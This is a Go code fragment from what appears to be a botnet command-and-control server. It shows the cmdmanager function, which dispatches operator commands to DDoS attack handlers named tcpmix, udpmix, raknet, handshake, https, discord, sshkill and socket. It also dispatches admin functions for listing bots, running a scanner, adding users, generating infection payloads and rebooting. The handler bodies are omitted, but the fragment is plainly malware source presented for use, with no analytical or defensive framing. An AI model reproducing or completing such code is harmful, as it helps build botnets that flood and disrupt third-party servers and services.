...
func cmdmanager(command string, conn net.Conn) {
	...
	if strings.HasPrefix(command, "running") {
		RunningCnc(conn)
	}
	...
	if strings.HasPrefix(command, "!tcpmix") {
		TcpmixCnc(command, conn, s.Login)
	}
	if strings.HasPrefix(command, "!udpmix") {
		UdpmixCnc(conn, s.Login, command)
	}
	if strings.HasPrefix(command, "!raknet") {
		RaknetCnc(conn, s.Login, command)
	}
	if strings.HasPrefix(command, "!handshake") {
		HandshakeCnc(conn, s.Login, command)
	}

	if strings.HasPrefix(command, "!https") {
		HttpsCnc(conn, s.Login, command)
	}

	if strings.HasPrefix(command, "!discord") {
		DiscordCnc(conn, s.Login, command)
	}

	if strings.HasPrefix(command, "!sshkill") {
		SshkillCnc(conn, s.Login, command)
	}

	if strings.HasPrefix(command, "!socket") {
		SocketCnc(command, conn, s.Login)
	}

	// admin commands

	if strings.HasPrefix(command, "bots") {
		BotsCnc(conn, s.Login)
	}

	if strings.HasPrefix(command, "scanner") {
		ScannerCnc(conn, s.Login)
	}

	if strings.HasPrefix(command, "adduser") {
		AdduserCnc(conn, s.Login, command)
	}

	if strings.HasPrefix(command, "payload") {
		GeneratePayloadCnc(conn, s.Login)
	}

	if strings.HasPrefix(command, "sreboot") {
		RebootCnc(conn, s.Login)
	}
